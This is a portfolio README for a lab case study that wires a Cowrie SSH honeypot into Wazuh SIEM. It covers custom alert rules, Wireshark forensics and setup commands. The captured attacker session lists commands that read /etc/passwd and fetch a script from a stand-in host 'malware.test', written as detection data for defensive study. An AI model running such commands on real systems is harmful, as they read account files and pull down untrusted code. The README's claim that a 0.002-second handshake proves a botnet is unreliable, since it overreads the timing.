# SAIZERO — Cowrie Honeypot + Wazuh SIEM Integration Case Study

[![Target](https://img.shields.io/badge/Target-Cowrie%20SSH%20Honeypot-blue?style=flat-square)](https://github.com/cowrie/cowrie)
[![Domain](https://img.shields.io/badge/Domain-Threat%20Detection-critical?style=flat-square)](https://github.com/Satz-N-Sentry/SAIZERO-Cowrie-Honeypot-CaseStudy)
[![SIEM](https://img.shields.io/badge/SIEM-Wazuh%20v4.14.4-purple?style=flat-square&logo=wazuh)](https://wazuh.com)
[![Tool](https://img.shields.io/badge/Tool-Wireshark-1679A7?style=flat-square&logo=wireshark)](https://wireshark.org)
[![Tool](https://img.shields.io/badge/Tool-Cowrie-orange?style=flat-square)](https://github.com/cowrie/cowrie)
[![Framework](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-red?style=flat-square)](https://attack.mitre.org)
[![OS](https://img.shields.io/badge/Attacker-BlackArch%20Linux-black?style=flat-square&logo=archlinux)](https://blackarch.org)
[![OS](https://img.shields.io/badge/Manager-Kali%20Linux-blue?style=flat-square&logo=kalilinux)](https://kali.org)
[![Program](https://img.shields.io/badge/Program-SAIZERO%20Internship%202026-darkblue?style=flat-square)](https://github.com/Satz-N-Sentry)

> **CyberLycan — Every shadow has a hunter.**
> SAIZERO | Ground Zero Defence

Real-time SSH honeypot threat detection pipeline — automated attacker command capture, SIEM alerting, network forensics, and zero false positives.

---

## Author

**Satheesh Nithiananthan** (CyberLycan) — SAIZERO Ground Zero Defence 🐺
📧 cyberlycan55@gmail.com | [LinkedIn](https://www.linkedin.com/in/satheesh-nithiananthan-86a2913ab)

---

## Lab Environment

| Field | Details |
|-------|---------|
| SIEM Manager | Wazuh v4.14.4 on Kali Linux |
| Honeypot | Cowrie SSH/Telnet — port 2222 |
| Attacker | BlackArch Linux `192.168.8.102` |
| Target (Honeypot) | Kali/Cowrie `192.168.8.105` |
| Log Transport | wazuh-logcollector (JSON) |
| Network Forensics | Wireshark — DPI + packet timing analysis |
| Scope | Local lab — Educational purposes only |

---

## Architecture

```
BlackArch Attacker (192.168.8.102)
        │
        │  ssh -p 2222 root@192.168.8.105
        │  wget http://malware.test/sentry_test.sh
        ▼
Cowrie Honeypot (192.168.8.105:2222)   ◄── lobo@kali
        │
        │  Structured JSON logs → cowrie.log
        ▼
Wazuh Manager (Kali Linux)
        │  wazuh-logcollector reads cowrie.log
        │  Rule chain: 100200 → 100201 / 100202
        ▼
Wazuh Dashboard → Threat Hunting → 🚨 ALERT
```

---

## Custom Wazuh Rules

| Rule ID | Level | Trigger | Description |
|---------|-------|---------|-------------|
| `100200` | 3 | `eventid` matches `^cowrie\.` | Parent — any Cowrie event |
| `100201` | **10 — High** | `cowrie.login.success` | Successful login to honeypot |
| `100202` | **7 — Med-High** | `cowrie.command.input` | Command executed inside honeypot |

```xml
<group name="cowrie,honeypot,">

  <rule id="100200" level="3">
    <decoded_as>json</decoded_as>
    <field name="eventid">^cowrie\.</field>
    <description>Cowrie honeypot event detected</description>
  </rule>

  <rule id="100201" level="10">
    <if_sid>100200</if_sid>
    <field name="eventid">cowrie.login.success</field>
    <description>Cyberlycan Alert: Successful login to Cowrie Honeypot!</description>
  </rule>

  <rule id="100202" level="7">
    <if_sid>100200</if_sid>
    <field name="eventid">cowrie.command.input</field>
    <description>Cyberlycan Alert: Command executed in Honeypot: $(input)</description>
  </rule>

</group>
```

---

## Attacker Session Captured

Commands executed by the attacker inside the honeypot:

```bash
root@svr04:~# ls -la
root@svr04:~# cat /etc/passwd
root@svr04:~# wget http://google.com
root@svr04:~# wget http://malware.test/sentry_test.sh
```

All captured automatically — zero analyst intervention required.

---

## Phase 7 — Network Forensics (Wireshark)

| Network Attribute | Value | Significance |
|-------------------|-------|-------------|
| Source IP (Attacker) | `192.168.8.102` | BlackArch Linux |
| Destination IP | `192.168.8.105` | Cowrie Honeypot |
| Target Port | `2222` | Custom SSH port |
| Protocol | `SSHv2` | Encrypted session |
| Attacker Source Port | `38512` | Ephemeral port |
| TCP Window Size | `42496` | Network fingerprint |
| Seq / Ack | `3062 / 2633` | Zero packet loss confirmed |

### ⚠️ Automated Attack Confirmed — Attacker Fingerprinting

> **Timing delta (SYN → established session): ~0.002 seconds**
>
> This ultra-low latency is **physically impossible for a human operator**.
> This timing signature confirms the attack was executed by an **automated exploitation script or botnet** — not an interactive manual session.

### SIEM Rule Tuning Based on Network Evidence

1. **Botnet Identification** — Multiple connections sharing Window Size `42496` and identical timing intervals can trigger a Wazuh rule escalation from `cowrie.login.success` (level 10) → `Coordinated Botnet Attack` (level 15)
2. **Evasion Detection** — No fragmentation or low-and-slow delivery confirmed. Current Wazuh `<frequency>` settings are sufficient for this threat profile

---

## Wazuh Alert Fields

| Field | Value | Significance |
|-------|-------|-------------|
| `rule.id` | `100202` | Custom command execution rule |
| `rule.level` | `7` | Medium-High severity |
| `data.eventid` | `cowrie.command.input` | Command was executed |
| `data.input` | `wget http://google.com` | Exact attacker command |
| `data.src_ip` | `192.168.8.102` | BlackArch attacker IP |
| `data.sensor` | `kali` | Honeypot sensor name |
| `data.session` | `a5f2ad2cc931` | Session UUID |
| `data.protocol` | `ssh` | Connection protocol |

---

## Quick Commands

```bash
# Start Cowrie
python -m cowrie.scripts.cowrie start

# Verify Cowrie running
python -m cowrie.scripts.cowrie status

# Test Wazuh rules before going live
sudo /var/ossec/bin/wazuh-logtest

# Watch live alerts
tail -f /var/ossec/logs/alerts/alerts.log

# Tail Cowrie log
tail -f var/log/cowrie/cowrie.log

# Validate rule XML syntax
xmllint --noout /var/ossec/etc/rules/local_rules.xml
```

---

## Repository Contents

```
├── README.md                                    ← This file
├── reports/
│   └── SAIZERO_Cowrie_Honeypot_CaseStudy.pdf   ← Full case study report
└── screenshots/
    ├── wazuh_threat_hunting_dashboard.png
    ├── cowrie_logtest_rule_100202.png
    ├── attacker_ssh_session.png
    ├── cowrie_log_tail.png
    ├── cowrie_status_running.png
    └── wireshark_sshv2_capture.png
```

---

## Tools

`Wazuh SIEM` `Cowrie Honeypot` `Wireshark` `Kali Linux` `BlackArch Linux` `Python venv` `xmllint`

## Tags

`Honeypot` `SIEM` `Wazuh` `Cowrie` `ThreatDetection` `NetworkForensics` `Wireshark` `MITRE` `CyberLycan` `SAIZERO` `ZeroFalsePositives` `SSH` `BlueTeam`

---

## Key Insight

> Any activity inside a honeypot is **inherently malicious** — no legitimate user should ever connect.
> This provides a **zero-false-positive** stream of threat intelligence, actionable immediately without analyst triage.

---

*For educational and portfolio purposes only. | SAIZERO — Ground Zero Defence*
